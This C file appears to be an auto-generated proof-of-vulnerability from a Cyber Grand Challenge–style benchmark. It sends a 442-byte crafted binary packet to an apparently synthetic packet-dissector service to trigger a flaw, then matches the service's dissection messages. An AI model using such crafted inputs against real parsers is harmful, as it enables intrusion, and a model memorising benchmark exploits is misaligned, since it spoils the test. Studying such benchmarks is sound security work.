#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xba\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xa2\x01\x00\x00\x9a\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x9a\x01\x00\x00"
         "\x97\x9c\x85\x19\x96\x80\xae\x02\x22\xd9\x3e\x20\x02\xfd\xdc\x60"
         "\x1c\xc3\xe8\x10\x01\x00\x00\x00\x66\x92\xd8\x37\xf8\x2c\xcb\x48"
         "\x01\x01\xff\x41\x00\x59\xd8\xf4\xff\xff\xcf\x2c\xd0\x1b\xf1\x4e"
         "\xd3\x8b\x06\x82\x8a\xa0\xf6\x05\x26\x91\x01\x00\x7a\x46\xdb\x65"
         "\x31\xff\x01\x00\xfe\x41\x00\x54\x44\xba\xd8\x40\x94\x52\x35\x31"
         "\xf5\x8c\x9c\x93\x5d\x6f\x10\x69\x5f\x68\x00\xc1\xe4\x45\x57\xff"
         "\xff\x9f\x10\xe6\x35\x20\xa5\x2c\xd5\xb4\xa3\x32\x5f\xd3\xcb\x9b"
         "\x51\x49\x41\x00\xb5\xba\xe5\x73\xd3\x0b\x00\xfa\x7c\xec\x66\xf3"
         "\x23\xcf\xf7\xdb\x01\xad\xef\x05\x9c\x4a\xda\x65\xc6\xc8\xff\xff"
         "\xff\x86\x10\x73\xcd\x9e\xa7\x25\x7b\x41\x0d\x47\x0c\x94\x03\x57"
         "\x34\x54\x18\xf5\x37\x00\x39\xa3\x9a\x29\x32\x30\x71\x7a\xee\x2b"
         "\x96\x38\x09\x2d\xb0\x8a\xe1\xd8\x97\x01\x2e\xa0\x54\x0d\x0d\x8f"
         "\xfc\x7b\xb0\xad\xba\xb8\xe9\xb1\xca\x70\x81\x3f\x45\x85\xdf\xe6"
         "\xb6\x79\xda\xc4\x8c\xe9\x33\x3d\x5e\x23\x00\xdd\x01\xb1\x84\xb3"
         "\x13\x35\x00\x2a\xe5\x5f\xf3\x3e\x92\x19\x53\x28\x7a\xac\x8b\x94"
         "\x05\x5a\xdc\xd1\xa8\xc0\x43\x6f\x1b\x18\x61\xf6\xdb\x64\x4d\x2f"
         "\x21\x10\x1d\xbb\xfb\x31\xe4\x6a\x1f\x4b\xec\xef\x23\x0c\xbc\xb5"
         "\xec\xf1\x6e\xd2\x92\x93\x2d\xb6\xad\x55\xab\xba\xbb\xee\x97\x7a"
         "\xe5\x2e\x49\x52\x41\x6f\xa8\x85\x4c\x8c\xf6\x1a\xf3\x5e\xd9\x43"
         "\xd1\x70\x5e\x41\xf5\x06\x65\xf7\xd1\xe3\x29\x2c\xbe\xd1\x2c\x13"
         "\x48\x29\x4c\x7d\x9a\xbc\x96\x53\xaf\x35\x33\x5e\x0e\x88\xe7\xb1"
         "\xa1\xfe\x95\xac\x38\x9b\x85\xee\x14\xaf\x4d\xc4\xa9\x5f\x88\xd8"
         "\x0b\x02\x40\xed\x18\x19\x9b\x21\xee\x5b\x4d\xc5\x42\xe9\xbd\xbf"
         "\xe9\x28\x3d\xd0\x5a\xe8\x87\xc8\xf0\xce\x1e\xea\xe1\x83\x53\xd1"
         "\x40\xc8\x4f\x4e\xf0\x3d\x7c\xc8\xa0\x50\x0d\x7c\xb3\x24\xf8\xf5"
         "\xa9\xc8\x23\x49\xd5\x9b\xea\x0c\xaf\xb3";
      static unsigned int write_00001_00000_len = 442;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaantioxygen
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x61\x6e\x74\x69\x6f\x78"
         "\x79\x67\x65\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
